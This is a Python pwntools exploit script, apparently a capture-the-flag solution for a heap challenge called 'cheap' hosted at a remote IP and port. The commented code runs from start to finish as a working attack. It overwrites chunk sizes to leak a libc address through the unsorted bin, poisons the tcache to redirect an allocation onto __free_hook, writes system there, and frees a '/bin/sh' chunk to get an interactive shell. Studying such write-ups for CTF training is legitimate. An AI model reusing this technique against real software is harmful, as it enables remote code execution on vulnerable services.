from pwn import *

#s = process('./cheap')
#raw_input('DEBUG')

s = remote('34.146.101.4', 30001)

unsorted_bin = 0x1ebbe0
system_offset = 0x55410
free_hook_offset = 0x1eeb28

def create(size, data):
	s.sendlineafter(b'Choice: ', b'1')
	s.sendlineafter(b'size: ', bytes(str(size), 'utf-8'))
	s.sendafter(b'data: ', data)

def delete():
	s.sendlineafter(b'Choice: ', b'3')

def show():
	s.sendlineafter(b'Choice: ', b'2')


#Part 1: leak libc

# Create first chunk use for change size of second chunk
create(0xf0, b'\n')
delete()

# Create the second and third chunk with the total size > 0x410 to out of tcache
create(0x200, b'\n')
delete()

create(0x400, b'\n')
delete()

# create chunk to prevent it from top chunk
create(0x90, b'\n')
delete()

# comeback to first chunk due to tcache and edit size of second chunk to be the total size of second and third chunk
payload = b'A' * 0xf0 + p64(0) + p64(0x621) + b'\n'
create(0xf0, payload)
delete()

# now create a chunk 0x200 with give us address of second chunk (with new size, so we have a chunk size 0x620)
create(0x200, b'\n')
# free it and it now go to the unsorted bin
delete()

# use first chunk again to leak the libc at fd of unsorted bin
create(0xf0, b'A' * 0x100)
show()

s.recvuntil(b'A' * 0x100)

unsorted_bin_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)

libc_base = unsorted_bin_leak - unsorted_bin
system = libc_base + system_offset
free_hook = libc_base + free_hook_offset

# delete and reuse again to reedit the chunk size, because we crash it with 'A' in previous step, to not cause segment fault
delete()
payload = b'A' * 0xf0 + p64(0) + p64(0x621)
create(0xf0, payload)

# Part 2: overwrite free_hook and get shell
create(0x40, b'\n') #create and delete the first 0x50 size chunk
delete()

create(0x50, b'\n') #create a chunk for latter use (I will call this s_chunk)
delete()

create(0x20, b'\n') #create 2 chunk 0x30 and 0x20 with the total size is 0x50
delete()

create(0x10, b'\n')
delete()

create(0x30, b'\n')  # not necessary but just for fun LOL

payload = b'A' * 0x50 + p64(0) + p64(0x51) + b'\n'
create(0x50, payload) #comback to s_chunk and edit the size of third chunk
delete()

create(0x20, b'\n') #create chunk 0x30
delete() #after this, we free the second 0x50 size chunk


payload = b'A' * 0x60 + p64(free_hook) + b'\n'

create(0x50, payload) 
# back to s_chunk and overwrite fd pointer of 0x50 chunk to free-hook
delete()

create(0x40, b'\n')
# create the first 0x50 chunk, after this, tcache take the fd pointer to allocate next
# 0x50 chunk, but I overwrite it to the free_hook, so next time allocate(0x50),
# it will give me a pointer to free_hook

create(0x40, p64(system) + b'\n') # write address system to free_hook

create(0x10, b'/bin/sh\n') #create a chunk with str “/bin/sh”
delete() # free it, the program will call system(“/bin/sh”)

s.interactive()
